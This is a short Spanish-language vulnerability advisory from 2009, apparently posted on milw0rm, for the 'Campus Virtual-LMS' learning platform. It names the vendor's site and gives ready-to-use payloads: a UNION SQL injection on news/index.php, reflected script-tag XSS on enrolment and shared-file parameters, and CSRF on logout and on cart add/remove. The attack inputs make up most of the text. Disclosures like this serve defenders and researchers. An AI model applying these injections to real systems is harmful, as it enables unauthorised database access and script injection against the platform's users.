@@ -1,0 +1,51 @@
++-----------------------------------------------------------------------------+
+LMS:   Campus Virtual-LMS
+WEB:   http://campusvirtualcomputrade.cae.net
+
+Autor: Yasión
+Fecha: 12 jun 2009
++-----------------------------------------------------------------------------+
+
+ -----------------------------------------------------------------------------+
+ [+] SQLi
+ -----------------------------------------------------------------------------+
+   Archivo: news/index.php [no logged]
+   GET: ?id
+   Inyección: -1 union select 1,2,3,4,5,6,7
+ -----------------------------------------------------------------------------+
+
+ -----------------------------------------------------------------------------+
+ [+] XSS
+ -----------------------------------------------------------------------------+
+   Archivo: enrolments/step1.php [no logged]
+   GET: ?courseid
+   Inyección: 1"><script>alert(/xD/.source)</script>
+
+   Archivo: files/shared_list.php [logged]
+   GET/POST: ?search
+   Inyección: "><script>alert(/xD/.source)</script><!--
+
+   Archivo: files/shared_list.php [logged]
+   GET: ?siteid
+   Inyección: "><script>alert(/xD/.source)</script><!--
+ -----------------------------------------------------------------------------+
+
+ -----------------------------------------------------------------------------+
+ [+] CSRF
+ -----------------------------------------------------------------------------+
+   Archivo: login/logout.php
+   Info: Desconecta al usuario mediante una imagen, un redireccionamiento, un
+   link...
+
+   Archivo: enrolments/step2.php
+   GET: ?action=[ACTION]&orderid=[ORDERID]&courseid=[COURSEID]
+   Info: Añade o elimina [ADD/DELETE] el curso identificado por COURSEID a la
+   cesta identificada por ODERID.    Sería necesario conocer por adelantado la
+   cesta del usuario. (No explotable)
+ -----------------------------------------------------------------------------+
+
++-----------------------------------------------------------------------------+
+Gretz: UnderSecurity.net
++-----------------------------------------------------------------------------+
+
+# milw0rm.com [2009-06-12]
